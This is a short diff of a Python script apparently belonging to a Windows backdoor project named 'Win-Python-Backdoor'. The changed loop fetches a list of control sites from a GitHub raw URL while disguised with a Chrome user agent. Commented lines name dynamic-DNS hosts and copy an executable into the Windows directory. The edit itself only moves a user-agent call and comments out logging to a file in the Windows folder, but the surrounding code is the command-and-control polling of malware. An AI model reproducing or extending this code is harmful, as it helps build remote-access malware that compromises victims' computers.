@@ -171,6 +171,7 @@ def myloop():
     #threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
     #sites = ["paner.altervista.org", "verifiche.ddns.net"]
+    ua = UserAgent()
     header = {'User-Agent':str(ua.chrome)}
     mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
     #print mainsite.text
@@ -184,33 +185,32 @@ def myloop():
     #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
 
 
-    ua = UserAgent()
-    #print(ua.chrome)
-    header = {'User-Agent':str(ua.chrome)}
+    
+    
     #header = {'User-Agent': 'Mozilla/5.0'}
     #print(header)
     
     
-    log_formatter = logging.Formatter('%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+#    log_formatter = logging.Formatter('%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+#
+#    logFile = os.getenv('windir')+"\\wup.log"
 
-    logFile = os.getenv('windir')+"\\wup.log"
+#    my_handler = RotatingFileHandler(logFile, mode='a', maxBytes=1*1024, 
+#                                 backupCount=2, encoding=None, delay=0)
+#    my_handler.setFormatter(log_formatter)
+#    my_handler.setLevel(logging.INFO)
 
-    my_handler = RotatingFileHandler(logFile, mode='a', maxBytes=1*1024, 
-                                 backupCount=2, encoding=None, delay=0)
-    my_handler.setFormatter(log_formatter)
-    my_handler.setLevel(logging.INFO)
+#    app_log = logging.getLogger('root')
+#    app_log.setLevel(logging.INFO)
 
-    app_log = logging.getLogger('root')
-    app_log.setLevel(logging.INFO)
-
-    app_log.addHandler(my_handler)
+#    app_log.addHandler(my_handler)
 
 
     #app_log.info("data")
     
     
     #logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
-    app_log.info('Start')
+#    app_log.info('Start')
     
     
 
